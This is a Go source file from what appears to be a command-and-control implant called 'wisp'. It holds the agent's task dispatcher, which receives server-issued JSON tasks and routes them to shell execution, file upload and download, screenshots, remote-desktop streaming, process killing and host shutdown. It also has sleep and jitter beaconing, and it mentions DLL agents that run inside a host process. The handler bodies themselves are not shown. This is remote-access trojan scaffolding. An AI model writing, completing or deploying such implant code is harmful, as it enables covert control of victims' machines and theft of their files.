package commands

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/user/wisp/agent/transport"
	"github.com/user/wisp/shared/protocol"
)

// Task represents a task received from the server.
type Task struct {
	ID        string `json:"id"`
	CommandID int    `json:"command_id"`
	Args      string `json:"args"`
}

// Result is sent back to the server after executing a task.
type Result struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Status string `json:"status"` // "completed" or "failed"
}

// Command IDs come from the shared protocol package to avoid drift.
const (
	CmdShell    = int(protocol.CmdShell)
	CmdLs       = int(protocol.CmdLs)
	CmdCd       = int(protocol.CmdCd)
	CmdCat      = int(protocol.CmdCat)
	CmdUpload   = int(protocol.CmdUpload)
	CmdDownload = int(protocol.CmdDownload)
	CmdPs       = int(protocol.CmdPs)
	CmdKillProc = int(protocol.CmdKillProc)
	CmdSysinfo  = int(protocol.CmdSysinfo)
	CmdSleep    = int(protocol.CmdSleep)
	CmdExit     = int(protocol.CmdExit)
	CmdLsJSON   = int(protocol.CmdLsJSON)
	CmdMkdir    = int(protocol.CmdMkdir)
	CmdRm       = int(protocol.CmdRm)
	CmdRename   = int(protocol.CmdRename)
	CmdExecFile = int(protocol.CmdExecFile)
	CmdIshellOpen = int(protocol.CmdIshellOpen)
	CmdIshellRun  = int(protocol.CmdIshellRun)
	CmdIshellClose = int(protocol.CmdIshellClose)
	CmdRDPStart = int(protocol.CmdRDPStart)
	CmdRDPStop  = int(protocol.CmdRDPStop)
	CmdRDPInput = int(protocol.CmdRDPInput)
	CmdRCPConnect    = int(protocol.CmdRCPConnect)
	CmdRCPDisconnect = int(protocol.CmdRCPDisconnect)
	CmdScreenshot    = int(protocol.CmdScreenshot)
	CmdPwd           = int(protocol.CmdPwd)
	CmdClientKill    = int(protocol.CmdClientKill)
	CmdHostReboot    = int(protocol.CmdHostReboot)
	CmdHostShutdown  = int(protocol.CmdHostShutdown)
	CmdHostLogoff    = int(protocol.CmdHostLogoff)
	CmdHostLock      = int(protocol.CmdHostLock)
)

// SleepCallback is called when the sleep command is received.
type SleepCallback func(sleep, jitter int)

// ExitCallback is called when the exit command is received.
type ExitCallback func()

// CommandTimeout is the default maximum runtime of a shell command before it is
// terminated (prevents a hung command from blocking the agent loop).
const CommandTimeout = 30 * time.Second

// Dispatcher processes tasks and returns results.
type Dispatcher struct {
	OnSleep SleepCallback
	OnExit  ExitCallback
	cwd     string

	// shellTimeout bounds how long a single shell command may run.
	shellTimeout time.Duration

	// interactive shell state (persistent process)
	ishell *ishellSession

	// forceExit enables the hard-exit safety net of CmdClientKill. Standalone
	// agents enable it; DLL agents leave it off so the host process survives.
	forceExit bool

	// remote desktop stream state
	rdpMu sync.Mutex
	rdp   *rdpSession

	// remote control channel client
	rcp *transport.RCPClient

	mu            sync.Mutex
	pendingBlocks []Result // queued download chunks waiting for the next checkin
}

// SetRCPClient attaches the remote control client used by CmdRCPConnect.
func (d *Dispatcher) SetRCPClient(c *transport.RCPClient) {
	d.rcp = c
}

// RCPClient returns the remote control client (nil when not configured).
func (d *Dispatcher) RCPClient() *transport.RCPClient {
	return d.rcp
}

// SetForceExit toggles whether CmdClientKill may hard-exit the process.
func (d *Dispatcher) SetForceExit(enabled bool) {
	d.forceExit = enabled
}

// NewDispatcher creates a new command dispatcher.
func NewDispatcher(onSleep SleepCallback, onExit ExitCallback) *Dispatcher {
	return &Dispatcher{
		OnSleep:      onSleep,
		OnExit:       onExit,
		shellTimeout: CommandTimeout,
	}
}

// DrainPending returns and clears the queued download chunks that still need
// to be reported to the server on the next checkin.
func (d *Dispatcher) DrainPending() []Result {
	d.mu.Lock()
	defer d.mu.Unlock()
	if len(d.pendingBlocks) == 0 {
		return nil
	}
	out := d.pendingBlocks
	d.pendingBlocks = nil
	return out
}

// queueBlocks appends download chunks to be reported on a later checkin.
func (d *Dispatcher) queueBlocks(blocks []Result) {
	if len(blocks) == 0 {
		return
	}
	d.mu.Lock()
	defer d.mu.Unlock()
	d.pendingBlocks = append(d.pendingBlocks, blocks...)
}

// Execute runs a task and returns the result.
func (d *Dispatcher) Execute(task *Task) *Result {
	var output string
	var status string = "completed"

	switch task.CommandID {
	case CmdShell:
		output = d.execShell(task.Args)
	case CmdLs:
		output = d.execLs(task.Args)
	case CmdCd:
		output = d.execCd(task.Args)
	case CmdCat:
		output = d.execCat(task.Args)
	case CmdPs:
		output = d.execPs()
	case CmdKillProc:
		output = d.execKill(task.Args)
	case CmdSysinfo:
		output = d.execSysinfo()
	case CmdSleep:
		output = d.execSleep(task.Args)
	case CmdExit:
		if d.OnExit != nil {
			d.OnExit()
		}
		output = "agent exiting"
	case CmdUpload:
		output = d.execUpload(task.Args)
	case CmdDownload:
		// Download chunks are reported over several checkins, so it builds
		// its own Result (status "downloading") and queues later chunks.
		return d.execDownload(task)
	case CmdLsJSON:
		output = d.execLsJSON(task.Args)
	case CmdMkdir:
		output = d.execMkdir(task.Args)
	case CmdRm:
		output = d.execRm(task.Args)
	case CmdRename:
		output = d.execRename(task.Args)
	case CmdExecFile:
		output = d.execExecFile(task.Args)
	case CmdIshellOpen:
		output = d.execIshellOpen(task.Args)
	case CmdIshellRun:
		output = d.execIshellRun(task.Args)
	case CmdIshellClose:
		output = d.execIshellClose()
	case CmdRDPStart:
		output = d.execRDPStart(task.Args)
	case CmdRDPStop:
		output = d.execRDPStop()
	case CmdRDPInput:
		output = d.execRDPInput(task.Args)
	case CmdRCPConnect:
		output = d.execRCPConnect(task.Args)
	case CmdRCPDisconnect:
		output = d.execRCPDisconnect()
	case CmdScreenshot:
		output = d.execScreenshot()
	case CmdPwd:
		output = d.execPwd()
	case CmdClientKill:
		output = d.execClientKill()
	case CmdHostReboot:
		output = execHostReboot()
	case CmdHostShutdown:
		output = execHostShutdown()
	case CmdHostLogoff:
		output = execHostLogoff()
	case CmdHostLock:
		output = execHostLock()
	default:
		output = fmt.Sprintf("unknown command: %d", task.CommandID)
		status = "failed"
	}

	return &Result{
		TaskID: task.ID,
		Output: output,
		Status: status,
	}
}

// ProcessTasks takes raw JSON task data and executes each task.
func (d *Dispatcher) ProcessTasks(tasksJSON []byte) ([]Result, error) {
	var tasks []Task
	if err := json.Unmarshal(tasksJSON, &tasks); err != nil {
		return nil, fmt.Errorf("unmarshal tasks: %w", err)
	}

	var results []Result
	for _, task := range tasks {
		result := d.Execute(&task)
		results = append(results, *result)
	}
	return results, nil
}
